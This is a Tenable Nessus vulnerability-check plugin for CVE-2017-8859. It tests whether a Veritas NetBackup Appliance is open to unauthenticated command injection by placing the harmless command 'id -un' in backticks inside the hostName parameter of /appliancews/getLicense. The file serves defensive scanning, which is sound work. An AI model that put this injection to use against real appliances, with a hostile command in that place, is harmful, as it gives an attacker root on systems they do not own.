#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(101301);
  script_version("1.9");
  script_set_attribute(attribute:"plugin_modification_date", value:"2023/05/29");

  script_cve_id("CVE-2017-8859");
  script_bugtraq_id(98383);
  script_xref(name:"IAVA", value:"2017-A-0152-S");

  script_name(english:"Veritas NetBackup Appliance 2.7.x / 3.0.x Remote Command Execution (VTS17-005) (exploit)");

  script_set_attribute(attribute:"synopsis", value:
"The remote backup management appliance is affected by a remote command
execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote Veritas NetBackup Appliance is affected by a remote command
execution vulnerability due to improper validation of user-supplied
input. An unauthenticated, remote attacker can exploit this, via a
specially crafted GET request, to execute arbitrary commands with root
privileges.

Nessus was able to exploit the vulnerability by sending a GET request
to /appliancews/getLicense with the command 'id -un' as the value of
the 'hostName' parameter.");
  script_set_attribute(attribute:"see_also", value:"https://www.veritas.com/content/support/en_US/security/VTS17-005.html");
  script_set_attribute(attribute:"see_also", value:"https://www.veritas.com/support/en_US/article.000126557");
  script_set_attribute(attribute:"solution", value:
"Apply the May 7th Emergency Engineering Binary (EEB) as referenced in
the vendor advisory.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:P/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2017-8859");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"false");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2017/05/07");
  script_set_attribute(attribute:"patch_publication_date", value:"2017/05/07");
  script_set_attribute(attribute:"plugin_publication_date", value:"2017/05/22");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:veritas:netbackup_appliance");
  script_set_attribute(attribute:"stig_severity", value:"I");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2017-2023 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("veritas_netbackup_appliance_web_console_detect.nbin");
  script_require_keys("installed_sw/NetBackup Appliance");

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("audit.inc");
include("url_func.inc");
include("http.inc");
include("webapp_func.inc");

app = "NetBackup Appliance";
get_kb_item_or_exit("installed_sw/" + app);

port = get_http_port(default:443);
if(get_port_transport(port) == ENCAPS_IP)
  exit(0, "Skipped testing non-https port " + port + ".");

install = get_install_from_kb(
  appname      : app,
  port         : port,
  exit_on_fail : TRUE
);

cmd = "id -un";
cmd_out = "root";
url = "/appliancews/getLicense?hostName=`" + cmd + "`";

unreserved = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_.!~*'()-]?/=";
url = urlencode(str: url, unreserved: unreserved);

http_set_read_timeout(20);
res = http_send_recv3(
  method        : "GET",
  item          : url,
  port          : port,
  exit_on_fail  : TRUE
);

if(res[0] =~ "^HTTP/[0-9]\.[0-9] 200" &&
  # regex match: ...<node id="root">...
  res[2] =~ '<\\s*node id\\s*=\\s*"' + cmd_out + '"\\s*>') 
{
  req = http_last_sent_request();
  security_report_v4(
    port        : port,
    severity    : SECURITY_HOLE,
    generic     : TRUE,
    request     : make_list(req),
    output      : chomp(res[2])
  );
}
else
{
  audit(AUDIT_HOST_NOT, "affected");
} 
